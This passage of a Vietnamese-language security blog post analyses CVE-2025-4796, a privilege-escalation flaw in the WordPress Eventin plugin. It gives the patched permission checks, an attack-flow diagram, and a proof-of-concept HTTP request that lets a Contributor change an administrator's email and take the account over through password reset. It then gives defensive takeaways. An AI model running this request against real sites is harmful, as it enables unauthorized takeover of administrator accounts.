</span></span><span class="line"><span class="cl">    <span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;administrator&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$target_user</span><span class="o">-&gt;</span><span class="na">roles</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">    <span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;editor&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$target_user</span><span class="o">-&gt;</span><span class="na">roles</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">    <span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;author&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$target_user</span><span class="o">-&gt;</span><span class="na">roles</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">    <span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;contributor&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$target_user</span><span class="o">-&gt;</span><span class="na">roles</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">    <span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;subscriber&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$target_user</span><span class="o">-&gt;</span><span class="na">roles</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">    <span class="nx">in_array</span><span class="p">(</span><span class="s1">&#39;etn-customer&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$target_user</span><span class="o">-&gt;</span><span class="na">roles</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nx">WP_Error</span><span class="p">(</span><span class="s1">&#39;forbidden&#39;</span><span class="p">,</span> <span class="s1">&#39;forbidden&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="mi">403</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Các kiểm tra này đảm bảo <strong>chỉ user hợp lệ mới được phép cập nhật speaker/organizer</strong>, ngăn chặn việc <strong>sửa email trái phép và chiếm quyền tài khoản</strong>.</p>
<h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="diagram-container">
  <pre class="mermaid">flowchart TD
A["Attacker (Authenticated – Contributor)"]
--> B["Access Speaker edit page in Eventin admin UI"]

B --> C["UI sends request to /wp-json/eventin/v2/speakers/{id}"]

C --> D["Attacker intercepts request using BurpSuite"]

D --> E["Modify {id} to target arbitrary user (e.g., Administrator)"]

E --> F["Change email field to attacker-controlled email"]

F --> G["Send forged request to API endpoint"]

G --> H["update_item_permissions_check() passes (Contributor has etn_manage_* capability)"]

H --> I["prepare_item_for_database() accepts and maps user-controlled id and email"]

I --> J["User_Model instantiated with attacker-supplied id"]

J --> K["update() overwrites user_email and calls wp_update_user()"]

K --> L["Target user's email is changed to attacker-controlled email"]

L --> M["Attacker triggers WordPress password reset for the victim account"]

M --> N["Reset link is delivered to attacker email"]

N --> O["Attacker sets new password"]

O --> P["Attacker logs in as victim (e.g., Administrator)"]

P --> Q["Privilege Escalation / Account Takeover achieved"]</pre>
  <pre class="mermaid-dark">flowchart TD
A["Attacker (Authenticated – Contributor)"]
--> B["Access Speaker edit page in Eventin admin UI"]

B --> C["UI sends request to /wp-json/eventin/v2/speakers/{id}"]

C --> D["Attacker intercepts request using BurpSuite"]

D --> E["Modify {id} to target arbitrary user (e.g., Administrator)"]

E --> F["Change email field to attacker-controlled email"]

F --> G["Send forged request to API endpoint"]

G --> H["update_item_permissions_check() passes (Contributor has etn_manage_* capability)"]

H --> I["prepare_item_for_database() accepts and maps user-controlled id and email"]

I --> J["User_Model instantiated with attacker-supplied id"]

J --> K["update() overwrites user_email and calls wp_update_user()"]

K --> L["Target user's email is changed to attacker-controlled email"]

L --> M["Attacker triggers WordPress password reset for the victim account"]

M --> N["Reset link is delivered to attacker email"]

N --> O["Attacker sets new password"]

O --> P["Attacker logs in as victim (e.g., Administrator)"]

P --> Q["Privilege Escalation / Account Takeover achieved"]</pre>
  <pre class="mermaid-neutral">flowchart TD
A["Attacker (Authenticated – Contributor)"]
--> B["Access Speaker edit page in Eventin admin UI"]

B --> C["UI sends request to /wp-json/eventin/v2/speakers/{id}"]

C --> D["Attacker intercepts request using BurpSuite"]

D --> E["Modify {id} to target arbitrary user (e.g., Administrator)"]

E --> F["Change email field to attacker-controlled email"]

F --> G["Send forged request to API endpoint"]

G --> H["update_item_permissions_check() passes (Contributor has etn_manage_* capability)"]

H --> I["prepare_item_for_database() accepts and maps user-controlled id and email"]

I --> J["User_Model instantiated with attacker-supplied id"]

J --> K["update() overwrites user_email and calls wp_update_user()"]

K --> L["Target user's email is changed to attacker-controlled email"]

L --> M["Attacker triggers WordPress password reset for the victim account"]

M --> N["Reset link is delivered to attacker email"]

N --> O["Attacker sets new password"]

O --> P["Attacker logs in as victim (e.g., Administrator)"]

P --> Q["Privilege Escalation / Account Takeover achieved"]</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i></div>
<template><pre>flowchart TD
A["Attacker (Authenticated – Contributor)"]
--> B["Access Speaker edit page in Eventin admin UI"]

B --> C["UI sends request to /wp-json/eventin/v2/speakers/{id}"]

C --> D["Attacker intercepts request using BurpSuite"]

D --> E["Modify {id} to target arbitrary user (e.g., Administrator)"]

E --> F["Change email field to attacker-controlled email"]

F --> G["Send forged request to API endpoint"]

G --> H["update_item_permissions_check() passes (Contributor has etn_manage_* capability)"]

H --> I["prepare_item_for_database() accepts and maps user-controlled id and email"]

I --> J["User_Model instantiated with attacker-supplied id"]

J --> K["update() overwrites user_email and calls wp_update_user()"]

K --> L["Target user's email is changed to attacker-controlled email"]

L --> M["Attacker triggers WordPress password reset for the victim account"]

M --> N["Reset link is delivered to attacker email"]

N --> O["Attacker sets new password"]

O --> P["Attacker logs in as victim (e.g., Administrator)"]

P --> Q["Privilege Escalation / Account Takeover achieved"]</pre></template>
</div><h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>
<p>Đăng nhập bằng tài khoản <strong>Contributor</strong>.</p>
</li>
<li>
<p>Thực hiện cập nhật speaker tại:
<code>http://localhost/wp-admin/admin.php?page=eventin#/speakers/edit/{id}</code>.</p>
</li>
</ol>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-12-cve-2025-4796/ui.png" title="Edit speaker" data-thumbnail="/posts/2026-01-12-cve-2025-4796/ui.png" data-sub-html="<h2>UI</h2><p>Edit speaker</p>"><img loading="lazy" src='/posts/2026-01-12-cve-2025-4796/ui.png' alt="UI" height="1123" width="1919"></a><figcaption class="image-caption">Edit speaker</figcaption>
  </figure></p>
<ol start="3">
<li>Bắt request bằng <strong>BurpSuite</strong> và gửi lại với <strong>ID của user bất kỳ</strong> cùng <strong>email do attacker kiểm soát</strong>.</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/eventin/v2/speakers/44</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">X-WP-Nonce</span><span class="o">:</span> <span class="l">valid_nonce</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">contributor_cookie</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">{
</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;summary&#34;: &#34;&lt;p&gt;asfsfas&lt;/p&gt;&#34;,
</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;social&#34;: [
</span></span></span><span class="line"><span class="cl"><span class="g">    {}
</span></span></span><span class="line"><span class="cl"><span class="g">  ],
</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;name&#34;: &#34;abc&#34;,
</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;email&#34;: &#34;hacker1@gmail.com&#34;,
</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;category&#34;: [
</span></span></span><span class="line"><span class="cl"><span class="g">    &#34;speaker&#34;
</span></span></span><span class="line"><span class="cl"><span class="g">  ],
</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;speaker_group&#34;: [
</span></span></span><span class="line"><span class="cl"><span class="g">    33
</span></span></span><span class="line"><span class="cl"><span class="g">  ],
</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;designation&#34;: &#34;rewrew&#34;,
</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;company_name&#34;: &#34;rewrew&#34;,
</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;date&#34;: null
</span></span></span><span class="line"><span class="cl"><span class="g">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-12-cve-2025-4796/result.png" title="Result" data-thumbnail="/posts/2026-01-12-cve-2025-4796/result.png" data-sub-html="<h2>Result</h2><p>Result</p>"><img loading="lazy" src='/posts/2026-01-12-cve-2025-4796/result.png' alt="Result" height="916" width="1498"></a><figcaption class="image-caption">Result</figcaption>
  </figure></p>
<ol start="4">
<li>
<p>Sử dụng chức năng <strong>reset password</strong> với email đã bị thay đổi.</p>
</li>
<li>
<p>Đăng nhập bằng tài khoản vừa chiếm quyền kiểm soát.</p>
</li>
</ol>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng CVE-2025-4796 trong plugin <strong>Eventin ≤ 4.0.34</strong> xuất phát từ việc <strong>không kiểm soát đầy đủ quyền chỉnh sửa user</strong> trong API <code>update_item</code>. Endpoint này cho phép người dùng có role <strong>Contributor</strong> thao tác với <strong>ID user tùy ý</strong> và cập nhật trực tiếp trường <strong>email</strong>, dẫn đến khả năng <strong>chiếm quyền tài khoản thông qua chức năng reset mật khẩu</strong>. Việc thiếu ràng buộc giữa đối tượng được chỉnh sửa và quyền thực tế của người gọi API đã tạo điều kiện cho <strong>Privilege Escalation</strong> và <strong>Account Takeover</strong>.</p>
<p>Phiên bản <strong>4.0.35</strong> đã khắc phục bằng cách bổ sung kiểm tra tồn tại user, kiểm soát quyền <code>edit_user</code>, giới hạn role hợp lệ và chặn cập nhật các role nhạy cảm, qua đó loại bỏ khả năng sửa email trái phép.</p>
<h2 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Không nên chỉ dựa vào <strong>capability tổng quát</strong> cho các endpoint nhạy cảm; cần kiểm tra <strong>quyền trên từng đối tượng (object-level authorization)</strong>.</li>
<li>Mọi tham số nhạy cảm từ request như <strong>user ID, email, role</strong> phải được <strong>xác thực và ràng buộc chặt chẽ</strong> trước khi ghi vào database.</li>
<li>Việc cho phép cập nhật <strong>email người dùng</strong> có thể gián tiếp dẫn đến <strong>Account Takeover</strong> thông qua cơ chế reset mật khẩu.</li>
<li>REST API trong WordPress cần kết hợp <strong>permission_callback</strong>, <strong>current_user_can(&rsquo;edit_user&rsquo;, $target_id)</strong> và <strong>role validation</strong> để tránh leo thang đặc quyền.</li>
<li>Luôn so sánh <strong>diff giữa phiên bản vá và phiên bản lỗi</strong> để xác định chính xác nguyên nhân và phạm vi ảnh hưởng của lỗ hổng.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/" target="_blank" rel="external nofollow noopener noreferrer">Privilege Escalation</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/wp-event-solution/vulnerability/wordpress-eventin-plugin-4-0-34-authenticated-contributor-privilege-escalation-via-user-email-change-account-takeover-vulnerability" target="_blank" rel="external nofollow noopener noreferrer">WordPress Eventin Plugin &lt;= 4.0.34 is vulnerable to a medium priority Privilege Escalation</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2026-01-11-cve-2025-8059/" title="CVE-2025-8059 Analysis &amp; POC">CVE-2025-8059 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-08-cve-2025-14156/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-07-cve-2025-2563/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-06-cve-2025-7654/" title="CVE-2025-7654 Analysis &amp; POC">CVE-2025-7654 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-05-cve-2025-55707/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-04-cve-2025-53425/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-03-cve-2025-6325/" title="CVE-2025-6325 Analysis &amp; POC">CVE-2025-6325 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-02-cve-2025-11923/" title="CVE-2025-11923 Analysis &amp; POC">CVE-2025-11923 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-01-cve-2025-11749/" title="CVE-2025-11749 Analysis &amp; POC">CVE-2025-11749 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-14-cve-2025-3102/" title="CVE-2025-3102 Analysis &amp; POC">CVE-2025-3102 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2026-01-12 16:01:37">Cập nhật ngày 2026-01-12&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/3d91be323f243b58410e8dc822602463801c186f" rel="external nofollow noopener noreferrer" target="_blank" title="Update post 2026-01-12-CVE-2025-4796&#10&#10Commit: 3d91be323f243b58410e8dc822602463801c186f [3d91be32]&#10Author: w41bu1&#10Date: 2026-01-12 16:01:37"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>3d91be32</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2026-01-12-cve-2025-4796/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2026-01-12-CVE-2025-4796/index.vi.md?plain=1" title="Xem mã nguồn" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2026-01-12-CVE-2025-4796/index.vi.md" title="Chỉnh sửa trang này" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-4796&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-4796&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2026-01-12-CVE-2025-4796/index.vi.md?plain=1%7c" title="Báo cáo lỗi" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41/Project/w41bu1.github.io/content/posts/2026-01-12-CVE-2025-4796/index.vi.md" title="Mở trong trình chỉnh sửa" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/" data-title="CVE-2025-4796 Analysis &amp; POC" data-hashtags="analyst,plugin,privilege escalation"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/" data-title="CVE-2025-4796 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/privilege-escalation/" class="post-tag" title="Nhãn - Privilege Escalation">Privilege Escalation</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2026-01-11-cve-2025-8059/" class="post-nav-item" rel="prev" title="CVE-2025-8059 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-8059 Analysis &amp; POC</a><a href="/vi/posts/2026-01-13-cve-2025-6688/" class="post-nav-item" rel="next" title="CVE-2025-4796 Analysis &amp; POC">CVE-2025-4796 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Nội dung</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Nội dung"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/js/config/8a281a8cbd87271bd4229e1a990ab54c.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
